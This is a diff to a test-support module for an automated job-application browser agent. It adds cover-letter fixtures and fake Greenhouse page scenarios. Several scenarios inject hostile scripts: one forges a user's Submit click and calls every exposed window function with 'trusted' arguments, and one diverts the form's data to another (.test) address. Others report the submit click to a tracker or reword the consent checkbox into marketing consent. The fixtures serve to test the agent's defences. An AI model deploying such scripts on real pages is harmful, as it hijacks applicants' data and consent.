@@ -12,6 +12,7 @@ a profile, saved answers, a confirmed location label, the sensitive store's entr
 
 from __future__ import annotations
 
+import dataclasses
 import hashlib
 import json
 import os
@@ -53,6 +54,33 @@ CONSENT = "I consent to Example Robotics storing my application data for 365 day
 
 def resume_payload(data: bytes = RESUME_BYTES, name: str = RESUME_NAME) -> FilePayload:
     return FilePayload(name=name, mime_type="application/pdf", buffer=data, sha256=hashlib.sha256(RESUME_BYTES).hexdigest())
+
+
+LETTER_TEXT = "# Cover letter\n\nDear Hiring Team,\n\nI would like to work on your robot arms.\n\nSincerely,\nSam Rivera\n"
+LETTER_BYTES = b"%PDF-1.4\n% a fictional cover letter for the apply agent's tests\n"
+LETTER_NAME = "Example-Robotics-Controls-Intern-cover_letter-v2.pdf"
+
+
+def letter_source(text: str = LETTER_TEXT, *, version: int = 2, document_id: str = "doc-1") -> dict[str, Any]:
+    """What ``policy.cover_letter_for`` answers for a role whose latest cover letter is approved."""
+    return {"document_id": document_id, "version": version, "content_sha256": hashlib.sha256(text.encode("utf-8")).hexdigest(), "content": text,
+            "file_name": LETTER_NAME, "problem_kind": "", "problem": ""}
+
+
+def letter_payload(data: bytes = LETTER_BYTES, name: str = LETTER_NAME, text: str = LETTER_TEXT) -> FilePayload:
+    """The approved letter's PDF as the runner reads it: its own hash, and the hash of the text it was rendered from."""
+    return FilePayload(name=name, mime_type="application/pdf", buffer=data, sha256=hashlib.sha256(data).hexdigest(),
+                       content_sha256=hashlib.sha256(text.encode("utf-8")).hexdigest())
+
+
+def with_letter(sources: apply_policy.Sources, **kwargs: Any) -> apply_policy.Sources:
+    return dataclasses.replace(sources, cover_letter=letter_source(**kwargs))
+
+
+def schema_with_required_letter() -> list[apply_policy.SchemaField]:
+    listing = fixture_json("schema_new.json")
+    next(block for block in listing["questions"] if block["label"] == "Cover Letter")["required"] = True
+    return apply_policy.parse_schema(listing)
 
 
 def fixture_schema() -> list[apply_policy.SchemaField]:
@@ -185,7 +213,7 @@ class BrowserAgentFactory:
 
     def __init__(
         self, scenario: str = "confirm", record_path: str = "", lookup_endpoints: tuple[Endpoint, ...] = FIXTURE_LOOKUP,
-        isolation: str = "process", mode: str = "", student: str = "",
+        isolation: str = "process", mode: str = "", student: str = "", letter_required: bool = False,
     ) -> None:
         self.scenario = scenario
         self.record_path = record_path
@@ -193,6 +221,7 @@ class BrowserAgentFactory:
         self.isolation = isolation
         self.mode = mode
         self.student = student
+        self.letter_required = letter_required   # the page marks its cover letter required, as the listing does
 
     def available(self) -> str:
         return ""
@@ -200,8 +229,10 @@ class BrowserAgentFactory:
     def __call__(self, *, mode: str, run_id: str, screenshot_dir: Path | None, timeouts: ApplyTimeouts,
                  on_progress: Callable[[str, str], None], heartbeat: Callable[[], None], ats: str = "greenhouse") -> RecordingAgent:
         mode = self.mode or mode
+        fake = HandoffGreenhouse(self.scenario)
+        fake.letter_required = self.letter_required
         return RecordingAgent(
-            fake=HandoffGreenhouse(self.scenario), record_path=self.record_path, mode=mode, adapter=GreenhouseAdapter(),
+            fake=fake, record_path=self.record_path, mode=mode, adapter=GreenhouseAdapter(),
             run_id=run_id, screenshot_dir=screenshot_dir,
             timeouts=(HANDOFF_TIMEOUTS if mode == "handoff" else TEST_TIMEOUTS) if timeouts == ApplyTimeouts() else timeouts,
             lookup_endpoints=self.lookup_endpoints, on_progress=on_progress, heartbeat=heartbeat,
@@ -220,13 +251,19 @@ HANDOFF_SCENARIOS = (
     "telemetry",                  # Snowplow-style usage reporting to c.spl.greenhouse.io on every input, POST and GET
     "security_code_twice",        # the code is asked for again after the first code POST
     "security_code_slow",         # the code POST is answered two seconds after it arrives (a real submit takes one to three)
+    "security_code_retry",        # the code widget submits on the 8th box and again every 2.5 s until the page moves on
+    "security_code_retry_twice",  # the retrying widget above, and the code is asked for again after the first code POST
+    "security_code_forger",       # the code widget fakes the student's press (a script click, a made-up event, every function on window), then submits
+    "consent_box_reworded",       # the accuracy box on the form says something other than the listing does (marketing, not accuracy)
+    "tracker_on_submit",          # a tracker reports the Submit click to another address while the form's own submission goes on as usual
+    "form_posts_elsewhere",       # the form sends its application to an address the app does not recognize (the page's own submit listener)
     "challenge",                  # the answer to the POST is a visible reCAPTCHA challenge frame
     "bframe_hidden",              # a reCAPTCHA frame is loaded but invisible, and the POST is refused with a 422
 )
 CODE_ANSWER_DELAY_S = 2.0
 _ALIASES = {
     "security_code_autosubmit": "security_code", "error_echoes_input": "validation_422", "security_code_twice": "security_code",
-    "security_code_slow": "security_code",
+    "security_code_slow": "security_code", "security_code_retry": "security_code", "security_code_retry_twice": "security_code", "security_code_forger": "security_code",
     "bframe_hidden": "validation_422",
 }
 _FORM = 'document.getElementById("application-form")'
@@ -236,6 +273,59 @@ _HANDOFF_SCRIPTS = {
       var boxes = document.querySelectorAll("#security-code input");
       if (Array.prototype.every.call(boxes, function (box) { return box.value; })) %s.requestSubmit();
     });""" % _FORM,
+    "security_code_retry": """(function () {
+      var form = %s, retry = null;
+      document.getElementById("security-code").addEventListener("input", function () {
+        var boxes = document.querySelectorAll("#security-code input");
+        if (retry || !Array.prototype.every.call(boxes, function (box) { return box.value; })) return;
+        form.requestSubmit();
+        retry = setInterval(function () { form.requestSubmit(); }, 2500);
+      });
+    })();""" % _FORM,
+    "security_code_retry_twice": """(function () {
+      var form = %s, retry = null;
+      document.getElementById("security-code").addEventListener("input", function () {
+        var boxes = document.querySelectorAll("#security-code input");
+        if (retry || !Array.prototype.every.call(boxes, function (box) { return box.value; })) return;
+        form.requestSubmit();
+        retry = setInterval(function () { form.requestSubmit(); }, 2500);
+      });
+    })();""" % _FORM,
+    "security_code_forger": """(function () {
+      var form = %s, done = false;
+      document.getElementById("security-code").addEventListener("input", function () {
+        var boxes = document.querySelectorAll("#security-code input");
+        if (done || !Array.prototype.every.call(boxes, function (box) { return box.value; })) return;
+        done = true;
+        // After the app has finished typing: a forgery during the typing is refused for that reason alone.
+        setTimeout(forge, 1500);
+      });
+      function forge() {
+        var button = form.querySelector("button[type=submit]"), tried = [];
+        try { button.dispatchEvent(new MouseEvent("click", {bubbles: true, cancelable: true})); tried.push("dispatch"); } catch (error) { /* refused */ }
+        try { button.click(); tried.push("click"); } catch (error) { /* refused */ }
+        try { button.dispatchEvent(new PointerEvent("click", {bubbles: true, cancelable: true, isTrusted: true})); tried.push("pointer"); } catch (error) { /* refused */ }
+        // Every function the page can see that a fresh frame does not have: a binding the app left in this world would show here.
+        var fresh = document.createElement("iframe");
+        document.body.appendChild(fresh);
+        var known = Object.getOwnPropertyNames(fresh.contentWindow);
+        document.body.removeChild(fresh);
+        var extra = Object.getOwnPropertyNames(window).filter(function (name) { return known.indexOf(name) < 0 && typeof window[name] === "function"; });
+        extra.forEach(function (name) {
+          [JSON.stringify({trusted: true, hit: true}), "1", true, {trusted: true}].forEach(function (argument) { try { window[name](argument); } catch (error) { /* refused */ } });
+        });
+        window.__forged = {tried: tried, functions: extra};
+        form.requestSubmit();
+      }
+    })();""" % _FORM,
+    "tracker_on_submit": """document.addEventListener("submit", function () {
+      fetch("https://events.example-analytics.test/collect", {method: "POST", body: new URLSearchParams({event: "apply_submit"})}).catch(function () {});
+    }, true);""",
+    "form_posts_elsewhere": """document.addEventListener("submit", function (e) {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      fetch("https://apply.example-robotics.test/submit", {method: "POST", body: new URLSearchParams(new FormData(%s))}).catch(function () {});
+    }, true);""" % _FORM,
     "upload_on_attach_unmarked": """document.getElementById("resume").addEventListener("change", function (e) { %s });""" % (_UPLOAD % "resume"),
     "upload_cover_letter": """document.getElementById("cover_letter").addEventListener("change", function (e) { %s });""" % (_UPLOAD % "cover"),
     "error_echoes_input": """window.grAfterSubmit = function (response) {
@@ -316,13 +406,18 @@ class HandoffGreenhouse(FakeGreenhouse):
             html = html.replace(
                 '"submitPath":"/examplerobotics/jobs/4000000001",', '"submitPath":"https://job-boards.greenhouse.io/examplerobotics/jobs/4000000001",',
             )
+        if self.scenario == "consent_box_reworded":
+            html = html.replace(
+                "I certify that the information I have provided is accurate</label>",
+                "I agree that Example Robotics may share my application with marketing partners</label>",
+            )
         script = _HANDOFF_SCRIPTS.get(self.scenario, "")
         return html.replace("<!--FAKE_SCENARIO-->", f"<script>{script}</script>" if script else "")
 
     def _submit(self, body: str, cors: dict[str, str]) -> Any:
         real = self.scenario
         self.posts += 1
-        if real == "security_code_twice" and self.posts <= 2:
+        if real in ("security_code_twice", "security_code_retry_twice") and self.posts <= 2:
             return Reply(428, fixture_text("security_code_428.json"), "application/json", {"access-control-allow-origin": "https://job-boards.greenhouse.io"})
         self.scenario = _ALIASES.get(real, real)
         try:
@@ -418,6 +513,35 @@ def type_code_late(page: Any, step: str) -> None:
             press_submit(page)
 
 
+PRESSES: list[float] = []   # time.monotonic() just before each press the students below make at a code prompt (a test clears it)
+
+
+def press_after_the_widget_gave_up(page: Any, step: str) -> None:
+    """The first turn is complete_and_submit. At a code prompt: when the boxes hold a code, wait 3.4 s (the retrying widget has tried twice by
+    then), then press Submit once, with a real mouse click. Never types anything."""
+    if step == "handoff":
+        complete_and_submit(page, step)
+    elif step == "security_code" and page.locator("#security-input-0").count() and page.input_value("#security-input-0"):
+        first = page.evaluate("() => { window.__armedAt = window.__armedAt || Date.now(); return window.__armedAt; }")
+        if page.evaluate("() => Date.now()") - first > 3400 and _once(page, "late_press"):
+            PRESSES.append(time.monotonic())
+            press_submit(page)
+
+
+def press_at_each_prompt_after_the_widget_gave_up(page: Any, step: str) -> None:
+    """Like ``press_after_the_widget_gave_up``, but for a form that asks for the code twice: the same press, 3.4 s after the last one (or after
+    the first prompt), up to twice, a real mouse click each time. The boxes keep what the app typed; it types nothing."""
+    if step == "handoff":
+        complete_and_submit(page, step)
+    elif step == "security_code" and page.locator("#security-input-0").count() and page.input_value("#security-input-0"):
+        since = page.evaluate("() => { window.__armedAt = window.__armedAt || Date.now(); return window.__lastPressAt || window.__armedAt; }")
+        count = page.evaluate("() => window.__pressCount || 0")
+        if count < 2 and page.evaluate("() => Date.now()") - since > 3400:
+            page.evaluate("() => { window.__lastPressAt = Date.now(); window.__pressCount = (window.__pressCount || 0) + 1; }")
+            PRESSES.append(time.monotonic())
+            press_submit(page)
+
+
 def die_in_the_turn(page: Any, step: str) -> None:
     """The driver process ends without closing anything (a crash): the browser it started is left for the parent to find."""
     if step == "handoff" and _once(page, "die"):
@@ -475,7 +599,7 @@ def attach_and_upload(page: Any, step: str) -> None:
 
 STUDENTS = {
     "complete_and_submit": complete_and_submit, "do_nothing": do_nothing, "close_window": close_window, "press_and_close": press_and_close,
-    "type_code_and_submit": type_code_and_submit, "type_code_late": type_code_late, "attach_and_upload": attach_and_upload, "press_when_typed": press_when_typed,
+    "type_code_and_submit": type_code_and_submit, "press_after_the_widget_gave_up": press_after_the_widget_gave_up, "press_at_each_prompt": press_at_each_prompt_after_the_widget_gave_up, "type_code_late": type_code_late, "attach_and_upload": attach_and_upload, "press_when_typed": press_when_typed,
     "die_in_the_turn": die_in_the_turn, "kill_the_driver_then_die": kill_the_driver_then_die,
 }
 
